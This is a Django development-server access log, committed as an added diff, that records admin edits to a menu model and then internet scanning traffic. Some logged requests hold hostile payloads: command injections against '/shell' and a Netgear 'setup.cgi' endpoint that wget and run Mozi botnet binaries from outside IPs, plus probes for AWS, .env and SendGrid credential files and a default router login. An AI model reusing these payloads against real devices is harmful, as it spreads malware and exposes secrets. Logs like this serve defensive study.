+[06/May/2022 05:13:54] "GET /admin/menu/menu/ HTTP/1.1" 200 21683
+[06/May/2022 05:13:54] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:13:55] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:13:55] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:14:10] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:14:10] "GET /admin/menu/menu/ HTTP/1.1" 200 22198
+[06/May/2022 05:14:10] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:14:12] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:14:12] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:14:34] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:14:35] "GET /admin/menu/menu/ HTTP/1.1" 200 22755
+[06/May/2022 05:14:35] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:14:36] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:14:36] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:14:57] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:14:57] "GET /admin/menu/menu/ HTTP/1.1" 200 23312
+[06/May/2022 05:14:57] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:14:59] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:14:59] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:15:17] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:15:17] "GET /admin/menu/menu/ HTTP/1.1" 200 23836
+[06/May/2022 05:15:17] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:15:18] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:15:18] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:15:38] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:15:38] "GET /admin/menu/menu/ HTTP/1.1" 200 24365
+[06/May/2022 05:15:38] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:15:39] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:15:39] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:15:53] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:15:54] "GET /admin/menu/menu/ HTTP/1.1" 200 24865
+[06/May/2022 05:15:54] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:15:56] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:15:56] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:16:30] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:16:30] "GET /admin/menu/menu/ HTTP/1.1" 200 25361
+[06/May/2022 05:16:30] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:16:33] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:16:33] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:16:48] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:16:48] "GET /admin/menu/menu/ HTTP/1.1" 200 25850
+[06/May/2022 05:16:48] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:16:51] "GET /admin/menu/menu/42/change/ HTTP/1.1" 200 9812
+[06/May/2022 05:16:51] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:16:54] "POST /admin/menu/menu/42/change/ HTTP/1.1" 302 0
+[06/May/2022 05:16:55] "GET /admin/menu/menu/ HTTP/1.1" 200 25859
+[06/May/2022 05:16:55] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:16:56] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:16:56] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:17:18] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:17:18] "GET /admin/menu/menu/ HTTP/1.1" 200 26400
+[06/May/2022 05:17:18] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:17:20] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:17:20] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:17:34] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:17:34] "GET /admin/menu/menu/ HTTP/1.1" 200 26903
+[06/May/2022 05:17:34] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:17:37] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:17:37] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:17:56] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:17:56] "GET /admin/menu/menu/ HTTP/1.1" 200 27396
+[06/May/2022 05:17:56] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:18:09] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:18:09] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:18:55] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:18:55] "GET /admin/menu/menu/ HTTP/1.1" 200 27945
+[06/May/2022 05:18:55] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:18:57] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:18:57] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:19:14] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:19:14] "GET /admin/menu/menu/ HTTP/1.1" 200 28483
+[06/May/2022 05:19:14] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:19:16] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:19:16] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:19:30] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:19:30] "GET /admin/menu/menu/ HTTP/1.1" 200 28995
+[06/May/2022 05:19:30] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:19:34] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:19:34] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:20:05] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:20:05] "GET /admin/menu/menu/ HTTP/1.1" 200 29575
+[06/May/2022 05:20:05] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:20:07] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:20:07] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:20:32] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:20:33] "GET /admin/menu/menu/ HTTP/1.1" 200 30114
+[06/May/2022 05:20:33] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:20:34] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:20:34] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:20:59] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:20:59] "GET /admin/menu/menu/ HTTP/1.1" 200 30635
+[06/May/2022 05:20:59] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:21:06] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:21:06] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:21:22] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:21:22] "GET /admin/menu/menu/ HTTP/1.1" 200 31166
+[06/May/2022 05:21:22] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:21:23] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:21:23] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:21:43] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:21:44] "GET /admin/menu/menu/ HTTP/1.1" 200 31685
+[06/May/2022 05:21:44] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:21:58] "POST /admin/menu/menu/ HTTP/1.1" 200 5281
+[06/May/2022 05:21:59] "POST /admin/menu/menu/ HTTP/1.1" 302 0
+[06/May/2022 05:21:59] "GET /admin/menu/menu/ HTTP/1.1" 200 30567
+[06/May/2022 05:21:59] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:22:36] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:22:36] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:23:03] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:23:03] "GET /admin/menu/menu/ HTTP/1.1" 200 31224
+[06/May/2022 05:23:03] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:23:06] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:23:06] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:23:21] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:23:22] "GET /admin/menu/menu/ HTTP/1.1" 200 31763
+[06/May/2022 05:23:22] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:23:23] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:23:23] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:23:25] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03?j\x90\x8b')
+[06/May/2022 05:23:25] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[06/May/2022 05:23:36] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:23:36] "GET /admin/menu/menu/ HTTP/1.1" 200 32291
+[06/May/2022 05:23:36] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:23:39] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:23:39] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:23:54] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:23:55] "GET /admin/menu/menu/ HTTP/1.1" 200 32816
+[06/May/2022 05:23:55] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:23:56] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:23:56] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:24:11] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:24:11] "GET /admin/menu/menu/ HTTP/1.1" 200 33326
+[06/May/2022 05:24:11] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:24:14] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:24:14] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:24:29] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:24:30] "GET /admin/menu/menu/ HTTP/1.1" 200 33861
+[06/May/2022 05:24:30] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:24:31] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:24:31] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:25:30] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:25:30] "GET /admin/menu/menu/ HTTP/1.1" 200 34511
+[06/May/2022 05:25:31] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:25:35] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:25:35] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:26:07] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:26:07] "GET /admin/menu/menu/ HTTP/1.1" 200 35161
+[06/May/2022 05:26:07] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:26:09] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:26:09] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:26:26] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:26:26] "GET /admin/menu/menu/ HTTP/1.1" 200 35700
+[06/May/2022 05:26:26] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+Not Found: /.aws/credentials
+[06/May/2022 05:36:10] "GET /.aws/credentials HTTP/1.1" 404 2243
+[06/May/2022 05:36:10] code 400, message Bad request syntax ('\x16\x03\x01\x01D\x01\x00\x01@\x03\x03\x06ç\x88\x90Þ+')
+[06/May/2022 05:36:10] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[06/May/2022 05:38:34] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[06/May/2022 05:55:35] "GET / HTTP/1.1" 404 2180
+Not Found: /shell
+[06/May/2022 06:03:12] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://113.4.175.10:51559/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 2302
+[06/May/2022 06:03:13,490] - Broken pipe from ('113.4.175.10', 49540)
+
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[06/May/2022 06:06:31] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1875
+[06/May/2022 06:06:32,064] - Broken pipe from ('89.248.164.165', 43670)
+
+Not Found: /
+[06/May/2022 06:12:28] "GET / HTTP/1.1" 404 2180
+[06/May/2022 06:49:16] "POST /menu/ HTTP/1.1" 200 28
+[06/May/2022 06:49:29] "POST /menu/ HTTP/1.1" 200 185
+Not Found: /boaform/admin/formLogin
+[06/May/2022 09:13:44] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 2310
+[06/May/2022 09:46:42] "POST /menu/ HTTP/1.1" 200 28
+[06/May/2022 09:55:25] code 400, message Bad request version ('À\x14À')
+[06/May/2022 09:55:25] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[06/May/2022 10:42:29] code 400, message Bad request syntax ('MGLNDD_118.67.132.87_80')
+[06/May/2022 10:42:29] "MGLNDD_118.67.132.87_80" 400 -
+Not Found: /
+[06/May/2022 10:56:02] "GET / HTTP/1.0" 404 2177
+Not Found: /favicon.ico
+[06/May/2022 10:56:03] "GET /favicon.ico HTTP/1.1" 404 2228
+Not Found: /robots.txt
+[06/May/2022 10:56:03] "GET /robots.txt HTTP/1.1" 404 2225
+Not Found: /.well-known/security.txt
+[06/May/2022 10:56:07] "GET /.well-known/security.txt HTTP/1.1" 404 2267
+[06/May/2022 11:50:53] "POST /menu/ HTTP/1.1" 200 28
+[06/May/2022 11:51:03] "GET /admin/ HTTP/1.1" 200 6834
+[06/May/2022 11:51:04] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
+[06/May/2022 11:51:04] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0
+[06/May/2022 11:51:04] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[06/May/2022 11:51:04] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0
+[06/May/2022 11:51:04] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[06/May/2022 11:51:04] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[06/May/2022 11:51:04] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[06/May/2022 11:51:04] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[06/May/2022 11:51:04] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
+[06/May/2022 11:51:04] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[06/May/2022 11:51:04] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[06/May/2022 11:51:04] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[06/May/2022 11:51:06] "GET /admin/menu/menu/ HTTP/1.1" 200 35497
+[06/May/2022 11:51:06] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[06/May/2022 11:51:06] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6932
+[06/May/2022 11:51:06] "GET /static/admin/js/core.js HTTP/1.1" 200 5698
+[06/May/2022 11:51:06] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 11:51:06] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 5984
+[06/May/2022 11:51:06] "GET /static/admin/js/actions.js HTTP/1.1" 200 7872
+[06/May/2022 11:51:06] "GET /static/admin/js/urlify.js HTTP/1.1" 200 7902
+[06/May/2022 11:51:06] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[06/May/2022 11:51:06] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 288580
+[06/May/2022 11:51:06] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+[06/May/2022 11:51:06] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[06/May/2022 11:51:35] "POST /menu/ HTTP/1.1" 200 28
+[06/May/2022 11:51:53] "POST /menu/ HTTP/1.1" 200 267
+Not Found: /.env
+[06/May/2022 11:58:31] "GET /.env HTTP/1.1" 404 2207
+Not Found: /
+[06/May/2022 11:58:32] "POST / HTTP/1.1" 404 2178
+Not Found: /
+[06/May/2022 12:11:40] "GET / HTTP/1.1" 404 2180
+Not Found: /solr/
+[06/May/2022 12:56:14] "GET /solr/ HTTP/1.1" 404 2210
+Not Found: /.env
+[06/May/2022 13:49:22] "GET /.env HTTP/1.1" 404 2207
+Not Found: /
+[06/May/2022 13:49:23] "POST / HTTP/1.1" 404 2178
+[06/May/2022 14:00:58] "GET /admin/db/index.php?lang=en HTTP/1.1" 302 0
+[06/May/2022 14:00:58] "GET /admin/login/?next=/admin/db/index.php%3Flang%3Den HTTP/1.1" 200 2259
+Not Found: /db/phpmyadmin4/index.php
+[06/May/2022 14:00:59] "GET /db/phpmyadmin4/index.php?lang=en HTTP/1.1" 404 2275
+Not Found: /mysql/index.php
+[06/May/2022 14:00:59] "GET /mysql/index.php?lang=en HTTP/1.1" 404 2248
+Not Found: /shopdb/index.php
+[06/May/2022 14:01:00] "GET /shopdb/index.php?lang=en HTTP/1.1" 404 2251
+Not Found: /db/websql/index.php
+[06/May/2022 14:01:00] "GET /db/websql/index.php?lang=en HTTP/1.1" 404 2260
+Not Found: /db/db-admin/index.php
+[06/May/2022 14:01:01] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 404 2266
+Not Found: /db/dbadmin/index.php
+[06/May/2022 14:01:01] "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 404 2263
+Not Found: /phpMyAdmin-5.1.3/index.php
+[06/May/2022 14:01:02] "GET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.1" 404 2281
+Not Found: /sendgrid.env
+[06/May/2022 14:15:43] "GET /sendgrid.env HTTP/1.1" 404 2231
+Not Found: /.env
+[06/May/2022 14:15:44] "GET /.env HTTP/1.1" 404 2207
+Not Found: /.sendgrid
+[06/May/2022 14:15:45] "GET /.sendgrid HTTP/1.1" 404 2222
+[06/May/2022 14:41:41] "POST /menu/ HTTP/1.1" 200 201
+[06/May/2022 14:42:04] "POST /menu/ HTTP/1.1" 200 28
+[06/May/2022 14:42:15] "POST /menu/ HTTP/1.1" 200 28
+[06/May/2022 14:42:29] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /
+[06/May/2022 15:30:14] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[06/May/2022 15:36:22] "GET / HTTP/1.1" 404 2177
+[06/May/2022 15:53:33,455] - Broken pipe from ('20.127.91.237', 55661)
+
+Not Found: /robots.txt
+[06/May/2022 15:53:33] "HEAD /robots.txt HTTP/1.0" 404 2237
+Not Found: /
+[06/May/2022 16:09:03] "GET / HTTP/1.1" 404 2180
+Not Found: /setup.cgi
+[06/May/2022 16:14:31] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://203.77.69.82:56269/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2397
+Not Found: /
+[06/May/2022 17:10:13] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[06/May/2022 17:14:09] "GET / HTTP/1.0" 404 2188
+Not Found: /
+[06/May/2022 18:37:05] "GET / HTTP/1.1" 404 2180
+Not Found: /.env
+[06/May/2022 18:38:57] "GET /.env HTTP/1.1" 404 2207
+Not Found: /
+[06/May/2022 18:38:57] "POST / HTTP/1.1" 404 2178
+Not Found: /
+[06/May/2022 20:19:48] "GET / HTTP/1.1" 404 2180
+Not Found: /HNAP1/
+[06/May/2022 21:28:22] "POST /HNAP1/ HTTP/1.0" 404 2217
+Not Found: /
+[06/May/2022 21:30:38] "GET / HTTP/1.1" 404 2180
+[06/May/2022 22:10:06,990] - Broken pipe from ('162.142.125.220', 38050)
+
+Not Found: /
+[06/May/2022 22:10:08] "GET / HTTP/1.1" 404 2180
+[06/May/2022 22:10:08,457] - Broken pipe from ('162.142.125.220', 38572)
+
+Not Found: /
+[06/May/2022 22:10:08] "GET / HTTP/1.1" 404 2177
+[06/May/2022 22:10:09] code 505, message Invalid HTTP version (2.0)
+[06/May/2022 22:10:09] "PRI * HTTP/2.0" 505 -
+Not Found: /ab2g
+[06/May/2022 23:01:24] "GET /ab2g HTTP/1.1" 404 2218
+Not Found: /ab2h
+[06/May/2022 23:01:35] "GET /ab2h HTTP/1.1" 404 2218
+Not Found: /config/getuser
+[07/May/2022 00:25:53] "GET /config/getuser?index=0 HTTP/1.1" 404 2248
+Not Found: /
+[07/May/2022 00:26:41] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[07/May/2022 00:26:41] "GET / HTTP/1.1" 404 2177
+Not Found: /wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:42] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2276
+Not Found: /xmlrpc.php
+[07/May/2022 00:26:42] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2229
+Not Found: /
+[07/May/2022 00:26:43] "GET / HTTP/1.1" 404 2177
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:43] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /web/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:44] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2288
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:44] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2306
+Not Found: /website/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:45] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2300
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:45] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2285
+Not Found: /news/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:46] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /2018/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:46] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:47] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:47] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:48] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2288
+Not Found: /test/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:48] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /media/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:49] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2294
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:49] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2288
+Not Found: /site/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:50] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:50] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2288
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[07/May/2022 00:26:51] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /
+[07/May/2022 00:44:43] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[07/May/2022 01:46:52] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[07/May/2022 02:46:09] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[07/May/2022 04:15:35] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[07/May/2022 04:24:29] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[07/May/2022 04:42:05] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[07/May/2022 05:12:23] "GET / HTTP/1.1" 404 2177
+[07/May/2022 05:24:11,024] - Broken pipe from ('167.94.138.45', 55280)
+
+Not Found: /
+[07/May/2022 05:24:12] "GET / HTTP/1.1" 404 2180
+[07/May/2022 05:24:12,401] - Broken pipe from ('167.94.138.45', 49822)
+
+Not Found: /
+[07/May/2022 05:24:12] "GET / HTTP/1.1" 404 2177
+[07/May/2022 05:24:13] code 505, message Invalid HTTP version (2.0)
+[07/May/2022 05:24:13] "PRI * HTTP/2.0" 505 -
+[07/May/2022 05:57:11] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 05:57:18] "POST /menu/ HTTP/1.1" 200 267
+Not Found: /
+[07/May/2022 06:40:57] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[07/May/2022 06:46:45] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[07/May/2022 06:51:07] "GET / HTTP/1.1" 404 2180
+Not Found: /hudson
+[07/May/2022 08:11:41] "GET /hudson HTTP/1.1" 404 2213
+[07/May/2022 08:42:20] code 400, message Bad request version ("x0-ýò&©\x07b\x134!\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À\xadÀ®À¬À$À(À#À'À")
+[07/May/2022 08:42:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /.env
+[07/May/2022 08:42:20] "GET /.env HTTP/1.1" 404 2207
+Not Found: /.env
+[07/May/2022 08:51:57] "GET /.env HTTP/1.1" 404 2207
+Not Found: /
+[07/May/2022 08:51:58] "POST / HTTP/1.1" 404 2178
+Not Found: /
+[07/May/2022 08:53:50] "GET / HTTP/1.1" 404 2180
+[07/May/2022 08:53:51] code 400, message Bad request syntax ('\x05\x01\x00')
+[07/May/2022 08:53:51] " " 400 -
+[07/May/2022 08:53:58] code 400, message Bad request syntax ('\x05\x01\x00')
+[07/May/2022 08:53:58] " " 400 -
+[07/May/2022 08:54:06] code 400, message Bad request syntax ('\x05\x01\x00')
+[07/May/2022 08:54:06] " " 400 -
+[07/May/2022 09:01:33] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[07/May/2022 09:01:33] " P¼Òã " 400 -
+[07/May/2022 09:01:41] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[07/May/2022 09:01:41] " P¼Òã " 400 -
+[07/May/2022 09:01:49] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[07/May/2022 09:01:49] " P¼Òã " 400 -
+Not Found: /http:/5.188.210.227/echo.php
+[07/May/2022 09:03:23] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 1830
+Not Found: /
+[07/May/2022 09:05:53] "GET / HTTP/1.1" 404 2180
+Not Found: /setup.cgi
+[07/May/2022 09:29:17] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://202.14.122.128:56279/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2399
+Not Found: /stalker_portal/server/tools/auth_simple.php
